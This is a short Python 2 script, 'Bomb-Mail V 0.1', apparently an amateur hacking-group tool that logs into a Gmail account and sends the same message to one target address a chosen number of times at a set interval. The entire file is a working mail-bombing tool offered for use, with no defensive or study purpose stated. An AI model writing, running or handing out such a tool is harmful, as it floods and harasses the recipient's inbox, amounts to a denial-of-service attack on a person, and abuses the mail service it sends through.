#!/usr/bin/python
import os
import time
import getpass
import smtplib
os.system('clear')
port = 587
x = 0
def head():
	print """
  ______              _        ______        _ _ 
 (____  \            | |      |  ___ \      (_) |
  ____)  ) ___  ____ | | _ ___| | _ | | ____ _| |
 |  __  ( / _ \|    \| || (___) || || |/ _  | | |
 | |__)  ) |_| | | | | |_) )  | || || ( ( | | | |
 |______/ \___/|_|_|_|____/   |_||_||_|\_||_|_|_|

#############################################################
# Bomb-Mail V 0.1                                           #
# Author: caryl                                             #
# Site: http://al-aryl.com, http://projects.gxrg.org        #
# Email: al_aryl@yahoo.com                                  #
# Credits: [G]unadarma [X]malang [R]esearch [G]roups        #
#############################################################
"""
head()
print '\nInput G-mail . .\n'
try:
	gmail_user = raw_input('G-mail: ')
	if gmail_user == "":
		print 'User invalid'
		exit()
	gmail_pwd = getpass.getpass()
	os.system('clear')
	try:
		jum = input('Send Values : ')
	except NameError:
		print 'Input Number !!!...'
	try:
		times = input('Time / Sends : ')
	except NameError:
		print 'Input Number !!!...'
	to = raw_input('To : ')
	if to == "":
		print 'Target invalid'
		exit()
	subject = raw_input('Subject : ')
	if subject == "":
		print 'Subject invalid'
		exit()
	messg = raw_input('Text : ')
	if messg == "":
		print 'Message invalid'
		exit()
	os.system('clear')
	print ('wait . . .')
	try:
		while 1:
			if x <= jum:
				print '\n[+] Send Mail',x
				server = smtplib.SMTP("smtp.gmail.com",port)
				server.ehlo()
				server.starttls()
				server.ehlo
				try:
					server.login(gmail_user, gmail_pwd)
					header = 'To: ' + to + '\n' + 'From: ' + gmail_user + '\n' + 'Subject: '+ subject + '\n'+ 'Text: '+ messg+'\n'
					headersd = '[+] To: ' + to + '\n' + '[+] From: ' + gmail_user + '\n' + '[+] Subject: '+ subject + '\n'+ '[+] Text: '+ messg+'\n'
					print headersd
					msg = header + '\n ' + messg + ' \n\n'
					server.sendmail(gmail_user, to, msg)
					server.quit()
				except:
					print '\nSorry check your User or Password'
					os.system('color f')
					exit()
				x = x + 1
				time.sleep(times)
				if x == jum:
					print '\nSend success',x
					exit()
	except:
		print '[+] Check your internet connection !!!...'
except KeyboardInterrupt:
     print '\nCtrl+c'
